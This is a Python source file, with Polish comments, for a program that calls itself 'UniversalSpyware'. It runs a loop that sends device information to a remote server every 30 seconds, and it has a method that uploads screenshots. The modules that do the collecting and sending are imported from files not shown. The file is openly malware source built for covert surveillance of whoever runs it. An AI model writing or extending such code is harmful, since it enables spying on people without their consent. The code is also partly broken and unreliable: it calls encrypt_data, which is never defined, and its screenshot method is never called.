import sys
import os
import time
import threading
from datetime import datetime
import json

# Dodaj ścieżkę do modułów
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from gui.spyware_gui import SpywareGUI
    print("GUI załadowane pomyślnie")
except ImportError as e:
    print(f"Błąd importu GUI: {e}")
    SpywareGUI = None

try:
    from core.device_info import get_device_info
    from core.screen_capture import capture_screen
    from communication.server_client import ServerClient
    print("Moduły załadowane pomyślnie")
except ImportError as e:
    print(f"Błąd importu modułów: {e}")

class UniversalSpyware:
    def __init__(self):
        self.is_running = False
        self.device_id = self.generate_device_id()
        self.server_client = ServerClient()
        self.gui = None
        
        # Inicjalizacja GUI
        if SpywareGUI:
            try:
                self.gui = SpywareGUI(self)
                print("GUI zainicjalizowane")
            except Exception as e:
                print(f"Nie można uruchomić GUI: {e}")
        else:
            print("GUI nie dostępne")
        
        self.log("Spyware zainicjalizowany")
    
    def generate_device_id(self):
        import uuid
        return str(uuid.uuid4())[:8]
    
    def log(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] {message}")
        
        # Zapisz do pliku logów
        try:
            with open("spyware.log", "a") as f:
                f.write(f"[{timestamp}] {message}\n")
        except:
            pass
    
    def start(self):
        self.is_running = True
        self.log("Spyware uruchomiony")
        
        # Uruchom GUI (jeśli dostępne)
        if self.gui:
            gui_thread = threading.Thread(target=self.start_gui)
            gui_thread.daemon = True
            gui_thread.start()
            print("GUI w osobnym wątku")
        
        # Główna pętla
        while self.is_running:
            try:
                # Wysyłanie informacji o urządzeniu co 30 sekund
                if time.time() % 30 < 1:
                    self.send_device_info()
                
                time.sleep(1)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.log(f"Błąd głównego cyklu: {e}")
                time.sleep(5)
    
    def start_gui(self):
        try:
            print("Uruchamiam GUI...")
            self.gui.run()
        except Exception as e:
            self.log(f"Błąd uruchomienia GUI: {e}")
    
    def stop(self):
        self.is_running = False
        self.log("Spyware zatrzymany")
    
    def send_device_info(self):
        try:
            info = get_device_info()
            info['device_id'] = self.device_id
            encrypted_data = encrypt_data(info)
            
            response = self.server_client.send_data({
                'type': 'device_info',
                'data': encrypted_data,
                'timestamp': datetime.now().isoformat()
            })
            
            if response:
                self.log("Informacje o urządzeniu wysłane")
                
        except Exception as e:
            self.log(f"Błąd wysyłania informacji: {e}")
    
    def capture_and_send_screen(self):
        try:
            screenshot_path = capture_screen()
            # Wysyłanie zrzutu ekranu
            self.server_client.send_screenshot(screenshot_path)
            self.log("Zrzut ekranu wysłany")
            
        except Exception as e:
            self.log(f"Błąd zrzutu ekranu: {e}")

# Inicjalizacja spyware
if __name__ == "__main__":
    print("Uruchamiam Universal Spyware...")
    spyware = UniversalSpyware()
    
    try:
        spyware.start()
    except KeyboardInterrupt:
        print("\nZatrzymywanie spyware...")
        spyware.stop()
